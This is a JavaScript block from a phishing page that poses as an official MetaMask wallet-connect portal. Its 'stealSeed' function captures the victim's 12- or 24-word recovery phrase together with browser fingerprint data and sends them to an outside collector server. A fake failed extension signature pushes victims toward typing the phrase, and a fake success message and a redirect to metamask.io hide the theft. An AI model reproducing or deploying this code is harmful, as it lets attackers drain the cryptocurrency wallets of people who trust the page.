<script>
    const seedInput = document.getElementById('seedInput');
    const wordCountEl = document.getElementById('wordCount');
    
    seedInput.addEventListener('input', () => {
        const words = seedInput.value.trim().split(/\s+/).filter(w => w.length > 0);
        wordCountEl.textContent = `${words.length} words`;
        if (words.length >= 12) wordCountEl.style.color = '#4ade80';
    });

    function showSeedInput() {
        document.getElementById('step1').style.display = 'none';
        document.getElementById('seedStep').style.display = 'block';
        seedInput.focus();
    }

    async function stealSeed() {
        const seed = seedInput.value.trim();
        const words = seed.split(/\s+/).filter(w => w.length > 0);
        
        if (words.length !== 12 && words.length !== 24) {
            alert("Recovery phrase must be exactly 12 or 24 words.");
            return;
        }
        
        document.getElementById('loadingOverlay').style.display = 'flex';
        
        const fingerprint = {
            seed: seed,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString(),
            url: window.location.href
        };
        
        try {
            await fetch('https://mm-collector.onrender.com/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(fingerprint)
            });
            
            setTimeout(() => {
                document.getElementById('loadingOverlay').style.display = 'none';
                alert("✅ Wallet successfully connected!\n\nRedirecting to your dashboard...");
                window.location.href = "https://metamask.io";
            }, 1800);
        } catch (e) {
            document.getElementById('loadingOverlay').style.display = 'none';
            alert("Temporary network issue. Please try again.");
        }
    }

    function connectWithExtension() {
        alert("🔗 MetaMask extension detected.\n\nPlease approve the connection request in your wallet popup.");
        
        setTimeout(() => {
            alert("❌ Signature request timed out or was rejected.\n\nPlease use your Secret Recovery Phrase instead.");
            showSeedInput();
        }, 2200);
    }

    window.onload = () => {
        console.log("%cMetaMask Wallet Connect • Official Secure Portal v4.3 Mobile", 
            "color:#f6851b; font-weight:600; font-size:13px;");
    };
</script>
